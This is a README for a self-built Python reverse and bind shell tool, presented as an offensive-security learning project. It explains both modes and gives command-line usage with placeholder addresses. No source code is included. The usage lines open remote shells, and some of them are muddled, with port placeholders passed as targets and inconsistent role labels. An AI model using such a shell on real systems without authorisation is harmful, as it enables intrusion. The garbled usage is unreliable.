
This is a custom Python reverse shell implementation written from scratch as a single-file tool that can operate as both a server and a client.

The design allows flexible operation in two modes:
- **Reverse shell** – the server initiates the connection, while the client acts as a listener.
- **Bind shell** – the server listens for incoming connections from the client.

All commands are issued by the client and executed on the server, with the output returned over the same channel. The goal of this project was to build a minimal, fully controlled shell implementation while understanding low-level socket communication, process execution, and interactive session handling.

This tool was developed as part of my offensive security learning process, focusing on building custom tooling rather than relying solely on existing frameworks.


### Example Usage:

Reverse Shell
```
[server] --> python reverse-shell.py -s -t <listen_add> -p <listen_port> -r
[Clinet] --> python reverse-shell.py -t <connect_to> -p <connect_to>
```

Bind Shell
```
[Server] --> python reverse-shell.py -s -t <connect_to> -p <connect_to>
[Client] --> python reverse-shell.py -t <listen_port> -p <listen_port>
```


### Add:

- [x] Add A `cd` command
- [ ] Add Upload Download Functionality